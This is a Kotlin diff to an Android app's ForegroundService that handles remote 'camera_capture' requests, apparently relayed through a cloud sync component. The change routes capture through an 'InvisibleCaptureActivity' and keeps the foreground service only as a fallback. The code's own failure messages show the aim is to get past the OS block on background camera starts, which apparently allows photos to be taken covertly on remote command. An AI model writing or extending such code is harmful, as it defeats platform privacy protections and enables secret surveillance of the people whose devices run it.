@@ -469,23 +469,35 @@ class ForegroundService : Service() {
             "camera_capture" -> {
                 markBackgroundAttempt(requestId)
                 try {
-                    val svcIntent = Intent(this, CameraCaptureService::class.java).apply {
+                    val actIntent = Intent(this, InvisibleCaptureActivity::class.java).apply {
+                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
+                        putExtra("action", "camera_capture")
                         putExtra("requestId", requestId)
                         putExtra("cameraFacing", cameraFacing)
                     }
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                        startForegroundService(svcIntent)
-                    } else {
-                        startService(svcIntent)
-                    }
+                    startActivity(actIntent)
+                    Log.d("ForegroundService", "Dispatched camera_capture via InvisibleCaptureActivity for request $requestId")
                 } catch (t: Throwable) {
-                    Log.e("ForegroundService", "CameraCaptureService start error: ${t.message}")
-                    CloudBridgeSync.updateRequestStatus(
-                        requestId = requestId,
-                        status = "failed",
-                        error = "Camera capture start error: ${t.message}",
-                        failureReason = "OS disallowed background camera start: ${t.message}"
-                    )
+                    Log.w("ForegroundService", "Failed to start InvisibleCaptureActivity, falling back to CameraCaptureService: ${t.message}")
+                    try {
+                        val svcIntent = Intent(this, CameraCaptureService::class.java).apply {
+                            putExtra("requestId", requestId)
+                            putExtra("cameraFacing", cameraFacing)
+                        }
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                            startForegroundService(svcIntent)
+                        } else {
+                            startService(svcIntent)
+                        }
+                    } catch (t2: Throwable) {
+                        Log.e("ForegroundService", "CameraCaptureService fallback failed: ${t2.message}")
+                        CloudBridgeSync.updateRequestStatus(
+                            requestId = requestId,
+                            status = "failed",
+                            error = "Camera capture start error: ${t2.message}",
+                            failureReason = "OS disallowed background camera start: ${t2.message}"
+                        )
+                    }
                 }
             }
             "screen_share", "camera_stream" -> {
